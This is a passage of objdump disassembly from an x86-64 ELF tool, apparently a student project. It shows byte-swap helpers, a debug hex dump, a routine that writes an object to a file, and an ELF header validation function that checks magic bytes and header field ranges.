    24e4:	c1 e0 08             	shl    $0x8,%eax
    24e7:	25 00 ff 00 ff       	and    $0xff00ff00,%eax
    24ec:	89 c2                	mov    %eax,%edx
    24ee:	8b 45 fc             	mov    -0x4(%rbp),%eax
    24f1:	c1 e8 08             	shr    $0x8,%eax
    24f4:	25 ff 00 ff 00       	and    $0xff00ff,%eax
    24f9:	09 d0                	or     %edx,%eax
    24fb:	89 45 fc             	mov    %eax,-0x4(%rbp)
    24fe:	8b 45 fc             	mov    -0x4(%rbp),%eax
    2501:	c1 c0 10             	rol    $0x10,%eax
    2504:	5d                   	pop    %rbp
    2505:	c3                   	ret    

0000000000002506 <ft_swap_64>:
    2506:	f3 0f 1e fa          	endbr64 
    250a:	55                   	push   %rbp
    250b:	48 89 e5             	mov    %rsp,%rbp
    250e:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    2512:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2516:	48 c1 e0 08          	shl    $0x8,%rax
    251a:	48 89 c2             	mov    %rax,%rdx
    251d:	48 b8 00 ff 00 ff 00 	movabs $0xff00ff00ff00ff00,%rax
    2524:	ff 00 ff 
    2527:	48 21 c2             	and    %rax,%rdx
    252a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    252e:	48 c1 e8 08          	shr    $0x8,%rax
    2532:	48 89 c1             	mov    %rax,%rcx
    2535:	48 b8 ff 00 ff 00 ff 	movabs $0xff00ff00ff00ff,%rax
    253c:	00 ff 00 
    253f:	48 21 c8             	and    %rcx,%rax
    2542:	48 09 d0             	or     %rdx,%rax
    2545:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2549:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    254d:	48 c1 e0 10          	shl    $0x10,%rax
    2551:	48 89 c2             	mov    %rax,%rdx
    2554:	48 b8 00 00 ff ff 00 	movabs $0xffff0000ffff0000,%rax
    255b:	00 ff ff 
    255e:	48 21 c2             	and    %rax,%rdx
    2561:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2565:	48 c1 e8 10          	shr    $0x10,%rax
    2569:	48 89 c1             	mov    %rax,%rcx
    256c:	48 b8 ff ff 00 00 ff 	movabs $0xffff0000ffff,%rax
    2573:	ff 00 00 
    2576:	48 21 c8             	and    %rcx,%rax
    2579:	48 09 d0             	or     %rdx,%rax
    257c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2580:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2584:	48 c1 c0 20          	rol    $0x20,%rax
    2588:	5d                   	pop    %rbp
    2589:	c3                   	ret    

000000000000258a <cpu_32>:
    258a:	f3 0f 1e fa          	endbr64 
    258e:	55                   	push   %rbp
    258f:	48 89 e5             	mov    %rsp,%rbp
    2592:	48 83 ec 10          	sub    $0x10,%rsp
    2596:	89 7d fc             	mov    %edi,-0x4(%rbp)
    2599:	89 f0                	mov    %esi,%eax
    259b:	88 45 f8             	mov    %al,-0x8(%rbp)
    259e:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
    25a2:	74 0d                	je     25b1 <cpu_32+0x27>
    25a4:	8b 45 fc             	mov    -0x4(%rbp),%eax
    25a7:	89 c7                	mov    %eax,%edi
    25a9:	67 e8 27 ff ff ff    	addr32 call 24d6 <ft_swap_32>
    25af:	eb 03                	jmp    25b4 <cpu_32+0x2a>
    25b1:	8b 45 fc             	mov    -0x4(%rbp),%eax
    25b4:	c9                   	leave  
    25b5:	c3                   	ret    

00000000000025b6 <cpu_64>:
    25b6:	f3 0f 1e fa          	endbr64 
    25ba:	55                   	push   %rbp
    25bb:	48 89 e5             	mov    %rsp,%rbp
    25be:	48 83 ec 10          	sub    $0x10,%rsp
    25c2:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    25c6:	89 f0                	mov    %esi,%eax
    25c8:	88 45 f4             	mov    %al,-0xc(%rbp)
    25cb:	80 7d f4 00          	cmpb   $0x0,-0xc(%rbp)
    25cf:	74 0f                	je     25e0 <cpu_64+0x2a>
    25d1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    25d5:	48 89 c7             	mov    %rax,%rdi
    25d8:	67 e8 28 ff ff ff    	addr32 call 2506 <ft_swap_64>
    25de:	eb 04                	jmp    25e4 <cpu_64+0x2e>
    25e0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    25e4:	c9                   	leave  
    25e5:	c3                   	ret    

00000000000025e6 <debug_dump>:
    25e6:	f3 0f 1e fa          	endbr64 
    25ea:	55                   	push   %rbp
    25eb:	48 89 e5             	mov    %rsp,%rbp
    25ee:	48 83 ec 30          	sub    $0x30,%rsp
    25f2:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    25f6:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    25fa:	89 55 dc             	mov    %edx,-0x24(%rbp)
    25fd:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
    2601:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2605:	48 89 c6             	mov    %rax,%rsi
    2608:	48 8d 05 a1 1c 00 00 	lea    0x1ca1(%rip),%rax        # 42b0 <_IO_stdin_used+0x2b0>
    260f:	48 89 c7             	mov    %rax,%rdi
    2612:	b8 00 00 00 00       	mov    $0x0,%eax
    2617:	ff 15 6b 39 00 00    	call   *0x396b(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    261d:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    2624:	00 
    2625:	eb 78                	jmp    269f <debug_dump+0xb9>
    2627:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    262b:	83 e0 03             	and    $0x3,%eax
    262e:	48 85 c0             	test   %rax,%rax
    2631:	75 26                	jne    2659 <debug_dump+0x73>
    2633:	8b 55 dc             	mov    -0x24(%rbp),%edx
    2636:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    263a:	48 c1 e0 02          	shl    $0x2,%rax
    263e:	48 01 d0             	add    %rdx,%rax
    2641:	48 89 c6             	mov    %rax,%rsi
    2644:	48 8d 05 7e 1c 00 00 	lea    0x1c7e(%rip),%rax        # 42c9 <_IO_stdin_used+0x2c9>
    264b:	48 89 c7             	mov    %rax,%rdi
    264e:	b8 00 00 00 00       	mov    $0x0,%eax
    2653:	ff 15 2f 39 00 00    	call   *0x392f(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2659:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    265d:	0f b6 40 5c          	movzbl 0x5c(%rax),%eax
    2661:	0f b6 d0             	movzbl %al,%edx
    2664:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2668:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
    266f:	00 
    2670:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2674:	48 01 c8             	add    %rcx,%rax
    2677:	8b 00                	mov    (%rax),%eax
    2679:	89 d6                	mov    %edx,%esi
    267b:	89 c7                	mov    %eax,%edi
    267d:	67 e8 07 ff ff ff    	addr32 call 258a <cpu_32>
    2683:	89 c6                	mov    %eax,%esi
    2685:	48 8d 05 48 1c 00 00 	lea    0x1c48(%rip),%rax        # 42d4 <_IO_stdin_used+0x2d4>
    268c:	48 89 c7             	mov    %rax,%rdi
    268f:	b8 00 00 00 00       	mov    $0x0,%eax
    2694:	ff 15 ee 38 00 00    	call   *0x38ee(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    269a:	48 83 45 f8 01       	addq   $0x1,-0x8(%rbp)
    269f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    26a3:	48 c1 e0 02          	shl    $0x2,%rax
    26a7:	48 39 45 d0          	cmp    %rax,-0x30(%rbp)
    26ab:	0f 87 76 ff ff ff    	ja     2627 <debug_dump+0x41>
    26b1:	bf 0a 00 00 00       	mov    $0xa,%edi
    26b6:	ff 15 84 38 00 00    	call   *0x3884(%rip)        # 5f40 <putchar@GLIBC_2.2.5>
    26bc:	90                   	nop
    26bd:	c9                   	leave  
    26be:	c3                   	ret    

00000000000026bf <dump_obj>:
    26bf:	f3 0f 1e fa          	endbr64 
    26c3:	55                   	push   %rbp
    26c4:	48 89 e5             	mov    %rsp,%rbp
    26c7:	48 83 ec 20          	sub    $0x20,%rsp
    26cb:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    26cf:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    26d3:	48 8b 40 08          	mov    0x8(%rax),%rax
    26d7:	ba ed 01 00 00       	mov    $0x1ed,%edx
    26dc:	be 41 02 00 00       	mov    $0x241,%esi
    26e1:	48 89 c7             	mov    %rax,%rdi
    26e4:	b8 00 00 00 00       	mov    $0x0,%eax
    26e9:	ff 15 e9 38 00 00    	call   *0x38e9(%rip)        # 5fd8 <open@GLIBC_2.2.5>
    26ef:	89 45 fc             	mov    %eax,-0x4(%rbp)
    26f2:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
    26f6:	79 27                	jns    271f <dump_obj+0x60>
    26f8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    26fc:	48 8b 40 08          	mov    0x8(%rax),%rax
    2700:	48 89 c6             	mov    %rax,%rsi
    2703:	48 8d 05 d0 1b 00 00 	lea    0x1bd0(%rip),%rax        # 42da <_IO_stdin_used+0x2da>
    270a:	48 89 c7             	mov    %rax,%rdi
    270d:	b8 00 00 00 00       	mov    $0x0,%eax
    2712:	ff 15 70 38 00 00    	call   *0x3870(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2718:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    271d:	eb 2f                	jmp    274e <dump_obj+0x8f>
    271f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2723:	8b 40 3c             	mov    0x3c(%rax),%eax
    2726:	89 c2                	mov    %eax,%edx
    2728:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    272c:	48 8b 48 10          	mov    0x10(%rax),%rcx
    2730:	8b 45 fc             	mov    -0x4(%rbp),%eax
    2733:	48 89 ce             	mov    %rcx,%rsi
    2736:	89 c7                	mov    %eax,%edi
    2738:	ff 15 2a 38 00 00    	call   *0x382a(%rip)        # 5f68 <write@GLIBC_2.2.5>
    273e:	8b 45 fc             	mov    -0x4(%rbp),%eax
    2741:	89 c7                	mov    %eax,%edi
    2743:	ff 15 4f 38 00 00    	call   *0x384f(%rip)        # 5f98 <close@GLIBC_2.2.5>
    2749:	b8 00 00 00 00       	mov    $0x0,%eax
    274e:	c9                   	leave  
    274f:	c3                   	ret    

0000000000002750 <check_corruption>:
    2750:	f3 0f 1e fa          	endbr64 
    2754:	55                   	push   %rbp
    2755:	48 89 e5             	mov    %rsp,%rbp
    2758:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
    275c:	48 89 7d 98          	mov    %rdi,-0x68(%rbp)
    2760:	48 89 75 90          	mov    %rsi,-0x70(%rbp)
    2764:	48 89 55 88          	mov    %rdx,-0x78(%rbp)
    2768:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    276c:	0f b6 00             	movzbl (%rax),%eax
    276f:	3c 7f                	cmp    $0x7f,%al
    2771:	75 3c                	jne    27af <check_corruption+0x5f>
    2773:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    2777:	48 83 c0 01          	add    $0x1,%rax
    277b:	0f b6 00             	movzbl (%rax),%eax
    277e:	3c 45                	cmp    $0x45,%al
    2780:	75 2d                	jne    27af <check_corruption+0x5f>
    2782:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    2786:	48 83 c0 02          	add    $0x2,%rax
    278a:	0f b6 00             	movzbl (%rax),%eax
    278d:	3c 4c                	cmp    $0x4c,%al
    278f:	75 1e                	jne    27af <check_corruption+0x5f>
    2791:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    2795:	48 83 c0 03          	add    $0x3,%rax
    2799:	0f b6 00             	movzbl (%rax),%eax
    279c:	3c 46                	cmp    $0x46,%al
    279e:	75 0f                	jne    27af <check_corruption+0x5f>
    27a0:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    27a4:	48 83 c0 04          	add    $0x4,%rax
    27a8:	0f b6 00             	movzbl (%rax),%eax
    27ab:	3c 02                	cmp    $0x2,%al
    27ad:	74 26                	je     27d5 <check_corruption+0x85>
    27af:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    27b3:	48 89 c6             	mov    %rax,%rsi
    27b6:	48 8d 05 3b 1b 00 00 	lea    0x1b3b(%rip),%rax        # 42f8 <_IO_stdin_used+0x2f8>
    27bd:	48 89 c7             	mov    %rax,%rdi
    27c0:	b8 00 00 00 00       	mov    $0x0,%eax
    27c5:	ff 15 bd 37 00 00    	call   *0x37bd(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    27cb:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    27d0:	e9 79 0a 00 00       	jmp    324e <check_corruption+0xafe>
    27d5:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    27d9:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    27dd:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    27e1:	0f b7 40 38          	movzwl 0x38(%rax),%eax
    27e5:	0f b7 c0             	movzwl %ax,%eax
    27e8:	89 45 d4             	mov    %eax,-0x2c(%rbp)
    27eb:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    27ef:	48 8b 50 20          	mov    0x20(%rax),%rdx
    27f3:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    27f7:	48 01 d0             	add    %rdx,%rax
    27fa:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    27fe:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2802:	0f b7 40 10          	movzwl 0x10(%rax),%eax
    2806:	66 83 f8 03          	cmp    $0x3,%ax
    280a:	76 30                	jbe    283c <check_corruption+0xec>
    280c:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2810:	0f b7 40 10          	movzwl 0x10(%rax),%eax
    2814:	0f b7 c0             	movzwl %ax,%eax
    2817:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    281b:	89 c6                	mov    %eax,%esi
    281d:	48 8d 05 f4 1a 00 00 	lea    0x1af4(%rip),%rax        # 4318 <_IO_stdin_used+0x318>
    2824:	48 89 c7             	mov    %rax,%rdi
    2827:	b8 00 00 00 00       	mov    $0x0,%eax
    282c:	ff 15 56 37 00 00    	call   *0x3756(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2832:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2837:	e9 12 0a 00 00       	jmp    324e <check_corruption+0xafe>
    283c:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2840:	0f b7 40 34          	movzwl 0x34(%rax),%eax
    2844:	66 83 f8 ff          	cmp    $0xffff,%ax
    2848:	74 0d                	je     2857 <check_corruption+0x107>
    284a:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    284e:	0f b7 40 34          	movzwl 0x34(%rax),%eax
    2852:	66 85 c0             	test   %ax,%ax
    2855:	75 30                	jne    2887 <check_corruption+0x137>
    2857:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    285b:	0f b7 40 34          	movzwl 0x34(%rax),%eax
    285f:	0f b7 c0             	movzwl %ax,%eax
    2862:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    2866:	89 c6                	mov    %eax,%esi
    2868:	48 8d 05 d1 1a 00 00 	lea    0x1ad1(%rip),%rax        # 4340 <_IO_stdin_used+0x340>
    286f:	48 89 c7             	mov    %rax,%rdi
    2872:	b8 00 00 00 00       	mov    $0x0,%eax
    2877:	ff 15 0b 37 00 00    	call   *0x370b(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    287d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2882:	e9 c7 09 00 00       	jmp    324e <check_corruption+0xafe>
    2887:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    288b:	48 8b 50 20          	mov    0x20(%rax),%rdx
    288f:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2893:	0f b7 40 34          	movzwl 0x34(%rax),%eax
    2897:	0f b7 c0             	movzwl %ax,%eax
    289a:	48 39 c2             	cmp    %rax,%rdx
    289d:	74 2e                	je     28cd <check_corruption+0x17d>
    289f:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    28a3:	48 8b 40 20          	mov    0x20(%rax),%rax
    28a7:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    28ab:	48 89 c6             	mov    %rax,%rsi
    28ae:	48 8d 05 b3 1a 00 00 	lea    0x1ab3(%rip),%rax        # 4368 <_IO_stdin_used+0x368>
    28b5:	48 89 c7             	mov    %rax,%rdi
    28b8:	b8 00 00 00 00       	mov    $0x0,%eax
    28bd:	ff 15 c5 36 00 00    	call   *0x36c5(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    28c3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    28c8:	e9 81 09 00 00       	jmp    324e <check_corruption+0xafe>
    28cd:	81 7d d4 fe ff 00 00 	cmpl   $0xfffe,-0x2c(%rbp)
    28d4:	7f 06                	jg     28dc <check_corruption+0x18c>
    28d6:	83 7d d4 00          	cmpl   $0x0,-0x2c(%rbp)
    28da:	7f 30                	jg     290c <check_corruption+0x1bc>
    28dc:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    28e0:	0f b7 40 38          	movzwl 0x38(%rax),%eax
    28e4:	0f b7 c0             	movzwl %ax,%eax
    28e7:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    28eb:	89 c6                	mov    %eax,%esi
    28ed:	48 8d 05 a4 1a 00 00 	lea    0x1aa4(%rip),%rax        # 4398 <_IO_stdin_used+0x398>
    28f4:	48 89 c7             	mov    %rax,%rdi
    28f7:	b8 00 00 00 00       	mov    $0x0,%eax
    28fc:	ff 15 86 36 00 00    	call   *0x3686(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2902:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2907:	e9 42 09 00 00       	jmp    324e <check_corruption+0xafe>
    290c:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2910:	0f b7 40 36          	movzwl 0x36(%rax),%eax
    2914:	66 83 f8 ff          	cmp    $0xffff,%ax
    2918:	74 0d                	je     2927 <check_corruption+0x1d7>
    291a:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    291e:	0f b7 40 36          	movzwl 0x36(%rax),%eax
    2922:	66 85 c0             	test   %ax,%ax
    2925:	75 30                	jne    2957 <check_corruption+0x207>
    2927:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    292b:	0f b7 40 36          	movzwl 0x36(%rax),%eax
    292f:	0f b7 c0             	movzwl %ax,%eax
    2932:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    2936:	89 c6                	mov    %eax,%esi
    2938:	48 8d 05 81 1a 00 00 	lea    0x1a81(%rip),%rax        # 43c0 <_IO_stdin_used+0x3c0>
    293f:	48 89 c7             	mov    %rax,%rdi
    2942:	b8 00 00 00 00       	mov    $0x0,%eax
    2947:	ff 15 3b 36 00 00    	call   *0x363b(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    294d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2952:	e9 f7 08 00 00       	jmp    324e <check_corruption+0xafe>
    2957:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    295b:	0f b7 40 3a          	movzwl 0x3a(%rax),%eax
    295f:	66 83 f8 ff          	cmp    $0xffff,%ax
    2963:	74 0d                	je     2972 <check_corruption+0x222>
    2965:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2969:	0f b7 40 3a          	movzwl 0x3a(%rax),%eax
    296d:	66 85 c0             	test   %ax,%ax
    2970:	75 30                	jne    29a2 <check_corruption+0x252>
    2972:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2976:	0f b7 40 3a          	movzwl 0x3a(%rax),%eax
    297a:	0f b7 c0             	movzwl %ax,%eax
    297d:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    2981:	89 c6                	mov    %eax,%esi
    2983:	48 8d 05 66 1a 00 00 	lea    0x1a66(%rip),%rax        # 43f0 <_IO_stdin_used+0x3f0>
    298a:	48 89 c7             	mov    %rax,%rdi
    298d:	b8 00 00 00 00       	mov    $0x0,%eax
    2992:	ff 15 f0 35 00 00    	call   *0x35f0(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2998:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    299d:	e9 ac 08 00 00       	jmp    324e <check_corruption+0xafe>
    29a2:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    29a6:	0f b7 40 3e          	movzwl 0x3e(%rax),%eax
    29aa:	66 83 f8 ff          	cmp    $0xffff,%ax
    29ae:	74 0d                	je     29bd <check_corruption+0x26d>
    29b0:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    29b4:	0f b7 40 3e          	movzwl 0x3e(%rax),%eax
    29b8:	66 85 c0             	test   %ax,%ax
    29bb:	75 30                	jne    29ed <check_corruption+0x29d>
    29bd:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    29c1:	0f b7 40 3e          	movzwl 0x3e(%rax),%eax
    29c5:	0f b7 c0             	movzwl %ax,%eax
    29c8:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    29cc:	89 c6                	mov    %eax,%esi
    29ce:	48 8d 05 4b 1a 00 00 	lea    0x1a4b(%rip),%rax        # 4420 <_IO_stdin_used+0x420>
    29d5:	48 89 c7             	mov    %rax,%rdi
    29d8:	b8 00 00 00 00       	mov    $0x0,%eax
    29dd:	ff 15 a5 35 00 00    	call   *0x35a5(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    29e3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    29e8:	e9 61 08 00 00       	jmp    324e <check_corruption+0xafe>
    29ed:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    29f1:	0f b7 40 3c          	movzwl 0x3c(%rax),%eax
    29f5:	0f b7 c0             	movzwl %ax,%eax
    29f8:	89 45 c4             	mov    %eax,-0x3c(%rbp)
    29fb:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    29ff:	48 8b 50 28          	mov    0x28(%rax),%rdx
    2a03:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    2a07:	48 01 d0             	add    %rdx,%rax
    2a0a:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    2a0e:	81 7d c4 fe ff 00 00 	cmpl   $0xfffe,-0x3c(%rbp)
    2a15:	7f 06                	jg     2a1d <check_corruption+0x2cd>
    2a17:	83 7d c4 00          	cmpl   $0x0,-0x3c(%rbp)
    2a1b:	7f 30                	jg     2a4d <check_corruption+0x2fd>
    2a1d:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2a21:	0f b7 40 3c          	movzwl 0x3c(%rax),%eax
    2a25:	0f b7 c0             	movzwl %ax,%eax
    2a28:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    2a2c:	89 c6                	mov    %eax,%esi
    2a2e:	48 8d 05 1b 1a 00 00 	lea    0x1a1b(%rip),%rax        # 4450 <_IO_stdin_used+0x450>
    2a35:	48 89 c7             	mov    %rax,%rdi
    2a38:	b8 00 00 00 00       	mov    $0x0,%eax
    2a3d:	ff 15 45 35 00 00    	call   *0x3545(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2a43:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2a48:	e9 01 08 00 00       	jmp    324e <check_corruption+0xafe>
    2a4d:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2a51:	0f b7 40 3e          	movzwl 0x3e(%rax),%eax
    2a55:	0f b7 c0             	movzwl %ax,%eax
    2a58:	48 c1 e0 06          	shl    $0x6,%rax
    2a5c:	48 89 c2             	mov    %rax,%rdx
    2a5f:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    2a63:	48 01 d0             	add    %rdx,%rax
    2a66:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
    2a6a:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    2a6e:	48 8b 40 18          	mov    0x18(%rax),%rax
    2a72:	48 39 45 90          	cmp    %rax,-0x70(%rbp)
    2a76:	76 0d                	jbe    2a85 <check_corruption+0x335>
    2a78:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    2a7c:	48 8b 40 18          	mov    0x18(%rax),%rax
    2a80:	48 85 c0             	test   %rax,%rax
    2a83:	75 2e                	jne    2ab3 <check_corruption+0x363>
    2a85:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    2a89:	48 8b 40 18          	mov    0x18(%rax),%rax
    2a8d:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    2a91:	48 89 c6             	mov    %rax,%rsi
    2a94:	48 8d 05 dd 19 00 00 	lea    0x19dd(%rip),%rax        # 4478 <_IO_stdin_used+0x478>
    2a9b:	48 89 c7             	mov    %rax,%rdi
    2a9e:	b8 00 00 00 00       	mov    $0x0,%eax
    2aa3:	ff 15 df 34 00 00    	call   *0x34df(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2aa9:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2aae:	e9 9b 07 00 00       	jmp    324e <check_corruption+0xafe>
    2ab3:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    2ab7:	48 8b 50 18          	mov    0x18(%rax),%rdx
    2abb:	48 8b 45 98          	mov    -0x68(%rbp),%rax
    2abf:	48 01 d0             	add    %rdx,%rax
    2ac2:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
    2ac6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
    2acd:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
    2ad4:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
    2adb:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
    2ae2:	e9 19 04 00 00       	jmp    2f00 <check_corruption+0x7b0>
    2ae7:	83 7d fc 02          	cmpl   $0x2,-0x4(%rbp)
    2aeb:	75 4b                	jne    2b38 <check_corruption+0x3e8>
    2aed:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2af0:	48 63 d0             	movslq %eax,%rdx
    2af3:	48 89 d0             	mov    %rdx,%rax
    2af6:	48 c1 e0 03          	shl    $0x3,%rax
    2afa:	48 29 d0             	sub    %rdx,%rax
    2afd:	48 c1 e0 03          	shl    $0x3,%rax
    2b01:	48 89 c2             	mov    %rax,%rdx
    2b04:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2b08:	48 01 d0             	add    %rdx,%rax
    2b0b:	8b 00                	mov    (%rax),%eax
    2b0d:	83 f8 01             	cmp    $0x1,%eax
    2b10:	75 26                	jne    2b38 <check_corruption+0x3e8>
    2b12:	48 8b 45 88          	mov    -0x78(%rbp),%rax
    2b16:	48 89 c6             	mov    %rax,%rsi
    2b19:	48 8d 05 90 19 00 00 	lea    0x1990(%rip),%rax        # 44b0 <_IO_stdin_used+0x4b0>
    2b20:	48 89 c7             	mov    %rax,%rdi
    2b23:	b8 00 00 00 00       	mov    $0x0,%eax
    2b28:	ff 15 5a 34 00 00    	call   *0x345a(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2b2e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2b33:	e9 16 07 00 00       	jmp    324e <check_corruption+0xafe>
    2b38:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2b3b:	48 63 d0             	movslq %eax,%rdx
    2b3e:	48 89 d0             	mov    %rdx,%rax
    2b41:	48 c1 e0 03          	shl    $0x3,%rax
    2b45:	48 29 d0             	sub    %rdx,%rax
    2b48:	48 c1 e0 03          	shl    $0x3,%rax
    2b4c:	48 89 c2             	mov    %rax,%rdx
    2b4f:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2b53:	48 01 d0             	add    %rdx,%rax
    2b56:	8b 00                	mov    (%rax),%eax
    2b58:	85 c0                	test   %eax,%eax
    2b5a:	75 45                	jne    2ba1 <check_corruption+0x451>
    2b5c:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2b5f:	48 63 d0             	movslq %eax,%rdx
    2b62:	48 89 d0             	mov    %rdx,%rax
    2b65:	48 c1 e0 03          	shl    $0x3,%rax
    2b69:	48 29 d0             	sub    %rdx,%rax
    2b6c:	48 c1 e0 03          	shl    $0x3,%rax
    2b70:	48 89 c2             	mov    %rax,%rdx
    2b73:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2b77:	48 01 d0             	add    %rdx,%rax
    2b7a:	8b 00                	mov    (%rax),%eax
    2b7c:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
    2b80:	89 c6                	mov    %eax,%esi
    2b82:	48 8d 05 87 19 00 00 	lea    0x1987(%rip),%rax        # 4510 <_IO_stdin_used+0x510>
    2b89:	48 89 c7             	mov    %rax,%rdi
    2b8c:	b8 00 00 00 00       	mov    $0x0,%eax
    2b91:	ff 15 f1 33 00 00    	call   *0x33f1(%rip)        # 5f88 <printf@GLIBC_2.2.5>
    2b97:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2b9c:	e9 ad 06 00 00       	jmp    324e <check_corruption+0xafe>
    2ba1:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
    2ba5:	75 51                	jne    2bf8 <check_corruption+0x4a8>
    2ba7:	8b 45 f0             	mov    -0x10(%rbp),%eax
    2baa:	48 63 d0             	movslq %eax,%rdx
    2bad:	48 89 d0             	mov    %rdx,%rax
    2bb0:	48 c1 e0 03          	shl    $0x3,%rax
    2bb4:	48 29 d0             	sub    %rdx,%rax
    2bb7:	48 c1 e0 03          	shl    $0x3,%rax
